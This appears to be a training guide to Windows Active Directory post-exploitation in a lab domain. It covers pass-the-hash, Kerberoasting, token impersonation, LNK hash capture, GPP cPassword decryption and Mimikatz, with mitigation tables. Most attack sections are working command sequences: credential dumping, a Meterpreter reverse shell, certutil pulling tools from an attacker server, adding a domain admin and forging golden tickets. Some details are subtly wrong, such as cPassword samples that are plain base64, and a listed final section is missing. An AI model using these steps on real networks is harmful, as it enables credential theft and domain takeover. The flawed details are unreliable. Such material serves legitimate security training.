# Windows Post-Exploitation Attacks: Visual Guide with Examples

## Table of Contents
1. [Pass Attacks Overview](#pass-attacks-overview)
2. [Kerberoasting](#kerberoasting)
3. [Token Impersonation](#token-impersonation)
4. [LNK File Attacks](#lnk-file-attacks)
5. [GPP/cPassword Attacks](#gpp-cpassword-attacks)
6. [Mimikatz](#mimikatz)
7. [Post-Compromise Attack Strategy](#post-compromise-attack-strategy)

---

## Pass Attacks Overview

### What are Pass Attacks?

**Pass attacks** allow attackers to authenticate using credentials (password or hash) without knowing the actual password. This is possible because Windows NTLM authentication uses hashes, not plaintext passwords.

### Pass the Password vs Pass the Hash

```
┌─────────────────────────────────────────────────────────────────┐
│                    Pass the Password                            │
├─────────────────────────────────────────────────────────────────┤
│  Attacker ────────> Target Server                               │
│  "I know the password"                                          │
│                                                                 │
│  • Requires plaintext password                                  │
│  • Works with any authentication method                         │
│  • Example: fcastle:Password1                                   │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                    Pass the Hash                                │
├─────────────────────────────────────────────────────────────────┤
│  Attacker ────────> Target Server                               │
│  "I know the hash"                                              │
│                                                                 │
│  • Requires NTLM hash only                                      │
│  • Works with NTLM authentication                               │
│  • Example: 32ed87bdb5fdc5e9cba88547376818d4                    │
└─────────────────────────────────────────────────────────────────┘
```

### How Pass Attacks Work

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Server    │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Authenticate with hash        │
       │     (no password needed)          │
       │─────────────────────────────────>│
       │                                  │
       │  2. Server validates hash         │
       │     against SAM database          │
       │                                  │
       │  3. Access granted!               │
       │<─────────────────────────────────│
       │                                  │
```

### CrackMapExec: The Swiss Army Knife

**CrackMapExec** is a powerful tool for pass attacks and network reconnaissance.

**Basic Commands:**

```bash
# Help
crackmapexec --help
crackmapexec smb --help

# Pass the password
crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1

# Pass the hash (NTLMv1)
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth

# Pass the hash (NTLMv2)
crackmapexec smb 192.168.138.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 --local-auth
```

### CrackMapExec Operations

**Visual Scheme of Operations:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    CrackMapExec Operations                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Authentication Check                                        │
│     crackmapexec smb 10.0.0.0/24 -u fcastle -p Password1       │
│     Result: Pwn3d! (local admin access)                        │
│                                                                 │
│  2. Dump SAM Database                                           │
│     crackmapexec smb 10.0.0.0/24 -u admin -H HASH --sam        │
│     Result: Local user hashes extracted                         │
│                                                                 │
│  3. Enumerate Shares                                            │
│     crackmapexec smb 10.0.0.0/24 -u admin -H HASH --shares     │
│     Result: Available file shares listed                        │
│                                                                 │
│  4. Dump LSA Secrets                                            │
│     crackmapexec smb 10.0.0.0/24 -u admin -H HASH --lsa        │
│     Result: Cached credentials extracted                        │
│                                                                 │
│  5. Run Modules                                                 │
│     crackmapexec smb 10.0.0.0/24 -u admin -H HASH -M lsassy    │
│     Result: In-memory credentials dumped                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### CrackMapExec Example Output

**Authentication Scan:**

```bash
$ crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1

SMB         192.168.138.137  445    DC01            [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.138.137  445    DC01            [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.138.138  445    FILESRV         [*] Windows Server 2016 Build 14393 x64 (name:FILESRV) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.138.138  445    FILESRV         [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.138.139  445    WORKSTATION01   [*] Windows 10.0 Build 19041 x64 (name:WORKSTATION01) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.138.139  445    WORKSTATION01   [-] MARVEL.local\fcastle:Password1 (Status:LogonFailure)
```

**What does "Pwn3d!" mean?**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Pwn3d! Meaning                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Pwn3d! = Local Administrator Access                            │
│                                                                 │
│  This means:                                                    │
│  • You have administrative privileges on the target machine     │
│  • You can dump SAM database                                    │
│  • You can execute commands remotely                            │
│  • You can install services                                     │
│  • You can create users                                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### --local-auth vs -d Domain

**Visual Comparison:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    --local-auth vs -d Domain                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  --local-auth (Local Authentication)                            │
│  ────────────────────────────────────────                       │
│  crackmapexec smb 10.0.0.0/24 -u admin -H HASH --local-auth    │
│                                                                 │
│  • Authenticates against local SAM database                     │
│  • Uses local administrator account                             │
│  • Works even if domain controller is unreachable               │
│  • Target: Local machine only                                   │
│                                                                 │
│  -d Domain (Domain Authentication)                              │
│  ─────────────────────────────────                              │
│  crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p P1 │
│                                                                 │
│  • Authenticates against domain controller                      │
│  • Uses domain account                                          │
│  • Requires domain connectivity                                 │
│  • Target: Domain resources                                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### CrackMapExec Database (cmedb)

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    CrackMapExec Database                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  cmedb                                                          │
│  ├── help                                                       │
│  ├── hosts      // All hosts discovered in the network          │
│  │   ├── 192.168.138.137                                        │
│  │   ├── 192.168.138.138                                        │
│  │   └── 192.168.138.139                                        │
│  └── creds      // All credentials found and where they work    │
│      ├── fcastle:Password1                                       │
│      │   ├── 192.168.138.137 (Pwn3d!)                           │
│      │   └── 192.168.138.138 (Pwn3d!)                           │
│      └── administrator:HASH                                     │
│          └── 192.168.138.137 (Pwn3d!)                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Dumping and Cracking Hashes

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Server    │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Dump SAM with secretsdump     │
       │─────────────────────────────────>│
       │                                  │
       │  2. Receive NTLM hashes          │
       │<─────────────────────────────────│
       │                                  │
       │  3. Identify hash type           │
       │     (hash-identifier)            │
       │                                  │
       │  4. Crack with Hashcat           │
       │     hashcat -m 1000 hash.txt     │
       │                                  │
       │  5. Password cracked!            │
       │     "Password123!"               │
       │                                  │
```

**Example Commands:**

```bash
# Dump SAM hashes using password
secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.138.137

# Dump SAM hashes using hash
secretsdump.py administrator@192.168.138.138 -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# Identify hash type
hash-identifier
> 32ed87bdb5fdc5e9cba88547376818d4
[+] NTLM

# Crack NTLM hash
hashcat -m 1000 32ed87bdb5fdc5e9cba88547376818d4 /usr/share/wordlists/rockyou.txt -O

# Crack Kerberos ticket
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
```

**Example secretsdump.py Output:**

```bash
$ secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.138.137

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Local SAM hashes (domain: DC01, uid: 500, sid: S-1-5-21-1234567890-1234567890-1234567890)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
fcastle:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::

[*] Dumping cached domain logon information (domain: MARVEL.local, uid: 500, sid: S-1-5-21-1234567890-1234567890-1234567890)
MARVEL.local\fcastle:$DCC2$10210#fcastle#e4b9b5e5e5e5e5e5e5e5e5e5e5e5e5e5

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
[*] DPAPI_SYSTEM
[*] NL$KM
[*] _SC_Audit
```

### WDigest Attack

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    WDigest Attack                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  WDigest is an older authentication protocol (Win7, 8, 2012)    │
│  It stores passwords in plaintext in memory                     │
│                                                                 │
│  Attack Flow:                                                   │
│  ────────────                                                   │
│  1. Enable WDigest registry key                                 │
│     HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\    │
│     WDigest\ "UseLogonCredential" = 1                          │
│                                                                 │
│  2. Wait for user to log in                                    │
│                                                                 │
│  3. Dump credentials with Mimikatz                              │
│     sekurlsa::logonPasswords                                    │
│                                                                 │
│  4. Get plaintext password!                                     │
│     Username: fcastle                                           │
│     Password: Password1                                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Pass Attack Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Avoid reusing local admin passwords** | Prevent lateral movement | Use unique passwords for each machine |
| **Disable Guest and Administrator accounts** | Reduce attack surface | Disable built-in accounts |
| **Limit administrators** | Least privilege | Use just-in-time administration |
| **Strong passwords** | Make cracking harder | Use passphrases, not common words |
| **Password rotation** | Limit credential lifetime | Rotate passwords regularly |
| **Account check-in/check-out** | Track sensitive accounts | Automate password rotation on check-in/out |

---

## Kerberoasting

### What is Kerberoasting?

**Kerberoasting** is an attack that targets service accounts in Active Directory. Attackers request Kerberos service tickets and crack them offline to obtain service account passwords.

### How Kerberoasting Works

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────────────────┐
│   Attacker  │                    │           KDC            │
│  (fcastle)  │                    │   (Domain Controller)   │
└──────┬──────┘                    └───────────┬─────────────┘
       │                                      │
       │  1. AS-REQ: "I want to authenticate" │
       │─────────────────────────────────────>│
       │                                      │
       │  2. AS-REP: TGT + session key        │
       │<─────────────────────────────────────│
       │                                      │
       │  3. TGS-REQ: "I want HTTP/webserver" │
       │     (with TGT)                       │
       │─────────────────────────────────────>│
       │                                      │
       │  4. TGS-REP: Service ticket          │
       │     Encrypted with service account   │
       │     password hash!                   │
       │<─────────────────────────────────────│
       │                                      │
       │  5. Extract ticket and crack offline │
       │     hashcat -m 13100 ticket.txt      │
       │                                      │
```

### Kerberoasting Attack Flow

**Step-by-Step Process:**

| Step | Description |
|------|-------------|
| **1. Compromise domain account** | Get any valid domain account |
| **2. Find service accounts with SPNs** | Identify Kerberoastable targets |
| **3. Request service tickets** | Use GetUserSPNs.py to request tickets |
| **4. Extract ticket hashes** | Tickets are encrypted with service account password |
| **5. Crack tickets offline** | Use Hashcat to crack the encryption |
| **6. Use cracked passwords** | Access services with cracked credentials |

### Service Principal Names (SPNs)

**What is an SPN?**

An **SPN** (Service Principal Name) is a unique identifier for a service instance in Active Directory.

**SPN Examples:**

```
HTTP/webserver.marvel.local
MSSQLSvc/dbserver.marvel.local:1433
cifs/fileserver.marvel.local
HOST/workstation01.marvel.local
```

**Why SPNs Matter:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Why SPNs Matter                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Service accounts with SPNs are Kerberoastable because:        │
│                                                                 │
│  1. Any domain user can request a service ticket               │
│  2. Tickets are encrypted with service account password        │
│  3. Service accounts often have weak passwords                 │
│  4. Cracking happens offline (no failed logins)                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Kerberoasting Walkthrough

**Step 1: Find Kerberoastable Users**

```bash
# Using BloodHound
# Run "Find Kerberoastable Users" query

# Using GetUserSPNs.py
GetUserSPNs.py MARVEL.local/fcastle:'Password1'@192.168.138.136 -dc-ip 192.168.138.136

# Output example:
ServicePrincipalName                Name           MemberOf
-----------------------------------  -------------  --------------------
HTTP/webserver.marvel.local         IIS_APPPOOL     Domain Users
MSSQLSvc/dbserver.marvel.local:1433 SQLService      Domain Users
cifs/fileserver.marvel.local        FileService     Domain Users
```

**Step 2: Request Service Tickets**

```bash
# Request tickets for all SPNs
GetUserSPNs.py MARVEL.local/fcastle:'Password1'@192.168.138.136 -dc-ip 192.168.138.136 -request

# Output example:
$krb5tgs$23$*IIS_APPPOOL$MARVEL.LOCAL$HTTP/webserver.marvel.local*$a1b2c3d4e5f6...
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MSSQLSvc/dbserver.marvel.local:1433*$f6e5d4c3b2a1...
$krb5tgs$23$*FileService$MARVEL.LOCAL$cifs/fileserver.marvel.local*$9f8e7d6c5b4a...
```

**Step 3: Save Tickets to File**

```bash
# Save tickets to file for cracking
GetUserSPNs.py MARVEL.local/fcastle:'Password1'@192.168.138.136 -dc-ip 192.168.138.136 -request -outputfile krb.txt
```

**Step 4: Crack Tickets with Hashcat**

```bash
# Crack Kerberos tickets (mode 13100)
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt -O

# Output example:
$krb5tgs$23$*IIS_APPPOOL$MARVEL.LOCAL$HTTP/webserver.marvel.local*$a1b2c3d4e5f6...:ServicePass123!
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MSSQLSvc/dbserver.marvel.local:1433*$f6e5d4c3b2a1...:DBPass456!
$krb5tgs$23$*FileService$MARVEL.LOCAL$cifs/fileserver.marvel.local*$9f8e7d6c5b4a...:FilePass789!
```

**Step 5: Use Cracked Passwords**

```bash
# Access service with cracked password
crackmapexec smb 192.168.138.138 -u IIS_APPPOOL -p ServicePass123! -d MARVEL.local

# Or use pass the hash
crackmapexec smb 192.168.138.138 -u IIS_APPPOOL -H 32ed87bdb5fdc5e9cba88547376818d4 -d MARVEL.local
```

### Kerberoasting Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Don't run service accounts as admin** | Limit privilege escalation | Use least privilege for service accounts |
| **Strong service account passwords** | Make cracking harder | Use long, complex passwords (25+ characters) |
| **Managed Service Accounts** | Automatic password management | Use gMSA or sMSA for service accounts |
| **Don't put passwords in description** | Avoid information leakage | Never store passwords in account description |
| **Regular password rotation** | Limit credential lifetime | Rotate service account passwords regularly |
| **Monitor for unusual ticket requests** | Detect attacks | Monitor for excessive TGS requests |

---

## Token Impersonation

### What is Token Impersonation?

**Token impersonation** allows attackers to impersonate another user's security token to gain their privileges without knowing their password.

### What is a Token?

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    What is a Token?                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  A token is a temporary key that allows access to a system/     │
│  network without providing credentials each time.               │
│                                                                 │
│  Two Types of Tokens:                                           │
│  ─────────────────────                                          │
│                                                                 │
│  1. Delegation Token                                            │
│     • Created for interactive logons                            │
│     • Allows access to network resources                        │
│     • Example: User logged in to desktop                        │
│                                                                 │
│  2. Impersonation Token                                         │
│     • Created for non-interactive access                        │
│     • Limited to local resources                                │
│     • Example: Accessing network drive                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### How Token Impersonation Works

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Machine   │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Gain initial access          │
       │     (as low-privilege user)      │
       │─────────────────────────────────>│
       │                                  │
       │  2. Load incognito module        │
       │     (in meterpreter)             │
       │                                  │
       │  3. List available tokens        │
       │     list_tokens -u               │
       │<─────────────────────────────────│
       │                                  │
       │  4. Impersonate domain admin     │
       │     impersonate_token MARVEL\\fcastle │
       │─────────────────────────────────>│
       │                                  │
       │  5. Execute commands as admin     │
       │     (dump hashes, create users)  │
       │<─────────────────────────────────│
       │                                  │
```

### Token Impersonation Walkthrough

**Step 1: Gain Initial Access**

```bash
# Using Metasploit psexec
msfconsole
search psexec
use exploit/windows/smb/psexec
set RHOSTS 192.168.138.137
set SMBUser fcastle
set SMBPass Password1
set SMBDomain MARVEL.local
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.138.149
run
```

**Step 2: Load Incognito Module**

```bash
# In meterpreter
load incognito
```

**Step 3: List Available Tokens**

```bash
# List delegation tokens
list_tokens -u

# Output example:
Delegation Tokens Available
========================================
MARVEL\fcastle
MARVEL\administrator
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

**Step 4: Impersonate Domain Admin**

```bash
# Impersonate domain admin token
impersonate_token MARVEL\\administrator

# Verify impersonation
getuid

# Output example:
Server username: MARVEL\administrator
```

**Step 5: Execute Commands as Admin**

```bash
# Get system shell
shell

# Verify privileges
whoami /priv

# Dump hashes with Mimikatz
mimikatz
privilege::debug
sekurlsa::logonPasswords

# Create new domain user
net user hawkeye Password1@ /add /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN

# Verify new user
secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.138.136
```

**Step 6: Revert to Original Token**

```bash
# Revert to original token
rev2self

# Verify
getuid

# Output example:
Server username: MARVEL\fcastle
```

### Token Impersonation with Mimikatz

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Token Impersonation with Mimikatz            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. List available tokens                                       │
│     token::list /admin                                          │
│                                                                 │
│  2. Impersonate token                                           │
│     token::elevate /impersonate                                 │
│                                                                 │
│  3. Verify impersonation                                        │
│     whoami /all                                                  │
│                                                                 │
│  4. Execute privileged commands                                 │
│     sekurlsa::logonPasswords                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Token Impersonation Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Limit token creation permissions** | Reduce impersonation risk | Restrict who can create tokens |
| **Local admin restrictions** | Limit lateral movement | Use just-in-time administration |
| **Session monitoring** | Detect suspicious activity | Monitor for unusual token usage |
| **Least privilege** | Minimize impact | Run services with minimal privileges |
| **Regular token audits** | Identify vulnerabilities | Audit token permissions regularly |

---

## LNK File Attacks

### What are LNK File Attacks?

**LNK file attacks** use malicious Windows shortcut files to capture NTLM hashes when users access network shares.

### How LNK File Attacks Work

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Victim    │
│             │                    │   User      │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Create malicious LNK file    │
       │     (points to attacker IP)      │
       │                                  │
       │  2. Drop LNK file on share       │
       │─────────────────────────────────>│
       │                                  │
       │  3. User clicks LNK file         │
       │     (or Windows auto-accesses)   │
       │                                  │
       │  4. Windows tries to access      │
       │     attacker IP                  │
       │─────────────────────────────────>│
       │                                  │
       │  5. Attacker captures hash       │
       │     (with Responder)             │
       │<─────────────────────────────────│
       │                                  │
```

### LNK File Attack Walkthrough

**Step 1: Create Malicious LNK File**

```powershell
# On attacker machine
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

**What the LNK File Does:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    LNK File Explanation                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  TargetPath: \\192.168.138.149\@test.png                       │
│  ─────────────────────────────────────────                     │
│  • Points to attacker IP (192.168.138.149)                     │
│  • Uses @ symbol to force authentication                       │
│  • Looks like a PNG file (deceptive)                           │
│                                                                 │
│  When user clicks:                                             │
│  1. Windows tries to access the file                           │
│  2. Requires authentication to attacker machine                │
│  3. User's NTLM hash is sent to attacker                       │
│  4. Attacker captures hash with Responder                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Step 2: Start Responder**

```bash
# On attacker machine
sudo responder -I eth0 -dP

# Output example:
[+] Listening for events...
[+] Responder started with the following options:
    - SMB Server: ON
    - HTTP Server: ON
    - HTTPS Server: OFF
    - DNS Server: ON
    - LLMNR Server: ON
    - NBT-NS Server: ON
```

**Step 3: Drop LNK File on Target Share**

```bash
# Using netexec with slinky module
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149

# Or manually copy to share
net use Z: \\192.168.138.137\share /user:fcastle Password1
copy test.lnk Z:\
net use Z: /delete
```

**Step 4: Wait for User to Access LNK File**

```bash
# When user accesses LNK file, Responder captures hash
[*] [SMB] NTLMv2 hash captured from 192.168.138.137
[*] [SMB] MARVEL\fcastle::MARVEL:1122334455667788:aabbccddeeff001122334455667788:0101000000000000c0cf...
```

**Step 5: Crack Captured Hash**

```bash
# Save hash to file
echo "MARVEL\fcastle::MARVEL:1122334455667788:aabbccddeeff001122334455667788:0101000000000000c0cf..." > hash.txt

# Crack with Hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Output example:
MARVEL\fcastle::MARVEL:1122334455667788:aabbccddeeff001122334455667788:0101000000000000c0cf...:Password1
```

### LNK File Attack Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Disable LLMNR** | Prevent LNK file attacks | Group Policy: Turn off Multicast Name Resolution |
| **User education** | Reduce phishing risk | Train users not to click suspicious files |
| **File share permissions** | Limit file placement | Restrict who can write to shares |
| **File monitoring** | Detect malicious files | Monitor for suspicious LNK files |
| **Network segmentation** | Limit lateral movement | Segment network to prevent spread |

---

## GPP/cPassword Attacks

### What are GPP/cPassword Attacks?

**Group Policy Preferences (GPP)** allowed administrators to create policies with embedded credentials. These credentials were encrypted using a publicly known key, making them easily decryptable.

### How GPP/cPassword Attacks Work

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Domain    │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Access SYSVOL share          │
       │     \\domain.local\SYSVOL        │
       │─────────────────────────────────>│
       │                                  │
       │  2. Search for XML files         │
       │     with cPassword field         │
       │<─────────────────────────────────│
       │                                  │
       │  3. Extract encrypted password   │
       │     from XML file                │
       │                                  │
       │  4. Decrypt with gpp-decrypt     │
       │     (using known AES key)        │
       │                                  │
       │  5. Get plaintext password!      │
       │     "AdminPass123!"              │
       │                                  │
```

### GPP/cPassword Attack Walkthrough

**Step 1: Access SYSVOL Share**

```bash
# Access SYSVOL share
net use Z: \\192.168.138.136\SYSVOL /user:fcastle Password1

# Navigate to policies folder
cd Z:\MARVEL.local\Policies

# List all XML files
dir /s /b *.xml
```

**Step 2: Search for cPassword Field**

```bash
# Search for cPassword in XML files
findstr /s /i cPassword *.xml

# Output example:
Groups.xml:          cPassword="Y3BsdXNwYXNzd29yZA=="
ScheduledTasks.xml:  cPassword="YWRtaW5wYXNzd29yZA=="
Services.xml:        cPassword="c2VydmljZXBhc3N3b3Jk"
```

**Step 3: Extract Encrypted Password**

```bash
# View XML file content
type Groups.xml

# Output example:
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-7167-4d3d-9335-8A2F3B3D8F4E}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDD98DBFA3}" name="Administrator" image="2" changed="2024-01-15 10:30:00" uid="{12345678-1234-1234-1234-123456789012}">
        <Properties action="U" newName="" fullName="" description="" cpassword="Y3BsdXNwYXNzd29yZA==" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" userName="Administrator"/>
    </User>
</Groups>
```

**Step 4: Decrypt Password**

```bash
# Decrypt using gpp-decrypt
gpp-decrypt Y3BsdXNwYXNzd29yZA==

# Output example:
cpluspassword
```

**Step 5: Use Decrypted Password**

```bash
# Use password to authenticate
crackmapexec smb 192.168.138.0/24 -u Administrator -p cpluspassword -d MARVEL.local

# Or use pass the hash
crackmapexec smb 192.168.138.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4 -d MARVEL.local
```

### GPP/cPassword Attack Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Apply KB2962486** | Patch vulnerability | Install Microsoft security update |
| **Delete old GPP XML files** | Remove vulnerable files | Delete all XML files with cPassword |
| **Use LAPS** | Secure password management | Use Local Administrator Password Solution |
| **Avoid storing credentials** | Reduce attack surface | Don't store passwords in GPP |
| **Regular audits** | Detect vulnerabilities | Audit SYSVOL for cPassword fields |

---

## Mimikatz

### What is Mimikatz?

**Mimikatz** is a powerful tool for viewing and stealing credentials, generating Kerberos tickets, and performing various post-exploitation activities on Windows systems.

### Mimikatz Capabilities

**Visual Scheme:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    Mimikatz Capabilities                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Credential Dumping                                          │
│     • Extract passwords from memory                             │
│     • Dump cached credentials                                   │
│     • Extract Kerberos tickets                                  │
│                                                                 │
│  2. Kerberos Ticket Manipulation                                │
│     • Create golden tickets                                     │
│     • Create silver tickets                                     │
│     • Pass the ticket                                           │
│                                                                 │
│  3. Token Manipulation                                          │
│     • List available tokens                                     │
│     • Impersonate tokens                                        │
│     • Elevate privileges                                        │
│                                                                 │
│  4. Cryptography Operations                                     │
│     • Decrypt encrypted data                                    │
│     • Extract cryptographic keys                                │
│     • Generate certificates                                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Credential Dumping with Mimikatz

**Visual Scheme:**

```
┌─────────────┐                    ┌─────────────┐
│   Attacker  │                    │   Target    │
│             │                    │   Machine   │
└──────┬──────┘                    └──────┬──────┘
       │                                  │
       │  1. Upload Mimikatz to target    │
       │     (via SMB share or HTTP)      │
       │─────────────────────────────────>│
       │                                  │
       │  2. Run Mimikatz as admin        │
       │     (requires debug privilege)   │
       │                                  │
       │  3. Enable debug privilege       │
       │     privilege::debug             │
       │                                  │
       │  4. Dump credentials             │
       │     sekurlsa::logonPasswords     │
       │                                  │
       │  5. Extract passwords and hashes │
       │<─────────────────────────────────│
       │                                  │
```

### Mimikatz Walkthrough

**Step 1: Download Mimikatz**

```bash
# Download from GitHub (gentilkiwi/mimikatz)
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20240115/mimikatz_trunk.zip

# Extract
unzip mimikatz_trunk.zip
```

**Step 2: Upload to Target Machine**

```bash
# Start HTTP server on attacker machine
python3 -m http.server 80

# On target machine (Windows)
# Open command prompt as administrator
cd C:\Users\fcastle\Downloads
mkdir mimikatz
cd mimikatz

# Download from attacker
certutil -urlcache -split -f http://192.168.138.149/mimikatz.exe mimikatz.exe
```

**Step 3: Run Mimikatz**

```bash
# Run Mimikatz
mimikatz.exe

# View available commands
privilege::
sekurlsa::
```

**Step 4: Enable Debug Privilege**

```bash
# Enable debug privilege (required for most operations)
privilege::debug

# Output example:
Privilege '20' OK
```

**Step 5: Dump Credentials**

```bash
# Dump all logon passwords
sekurlsa::logonPasswords

# Output example:
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Interactive from 1
User Name         : fcastle
Domain            : MARVEL
Logon Server      : DC01
Logon Time        : 1/15/2024 10:30:00 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
        msv :
         [00000003] Primary
         * Username : fcastle
         * Domain   : MARVEL
         * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
         * SHA1     : 8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9
        tspkg :
         * Username : fcastle
         * Domain   : MARVEL
         * Password : Password1
        wdigest :
         * Username : fcastle
         * Domain   : MARVEL
         * Password : Password1
        kerberos :
         * Username : fcastle
         * Domain   : MARVEL.LOCAL
         * Password : Password1
```

**Step 6: Dump Kerberos Tickets**

```bash
# Dump Kerberos tickets
kerberos::list

# Output example:
[*] Start time: 1/15/2024 10:30:00 AM
[*] End time: 1/15/2024 8:30:00 PM
[*] Renew time: 1/16/2024 10:30:00 AM
[*] Service Name (2) : krbtgt/MARVEL.LOCAL @ MARVEL.LOCAL
[*] Service Name (6) : HTTP/webserver.marvel.local @ MARVEL.LOCAL
[*] Target Name : HTTP/webserver.marvel.local @ MARVEL.LOCAL
[*] Client Name : fcastle @ MARVEL.LOCAL
[*] Flags 0x50e00000 : name_canonicalize pre_authent renewable forwardable
[*] Session Key : 0x9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d - aes256_hmac
[*] Ticket : 0x12 0x34 0x56 0x78 0x9a 0xbc 0xde 0xf0 ...
```

**Step 7: Create Golden Ticket**

```bash
# Create golden ticket
kerberos::golden /user:administrator /domain:MARVEL.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2 /ticket:golden.kirbi

# Output example:
User : administrator
Domain : MARVEL.local
SID : S-1-5-21-1234567890-1234567890-1234567890
KRBTGT Hash : 8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2
Ticket saved to : golden.kirbi
```

**Step 8: Pass the Ticket**

```bash
# Pass the ticket
kerberos::ptt golden.kirbi

# Output example:
[*] Ticket successfully imported!
```

### Mimikatz Mitigation

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Disable WDigest** | Prevent plaintext password storage | Set UseLogonCredential to 0 |
| **Enable Credential Guard** | Protect credentials | Enable Windows Defender Credential Guard |
| **Use LAPS** | Secure local admin passwords | Use Local Administrator Password Solution |
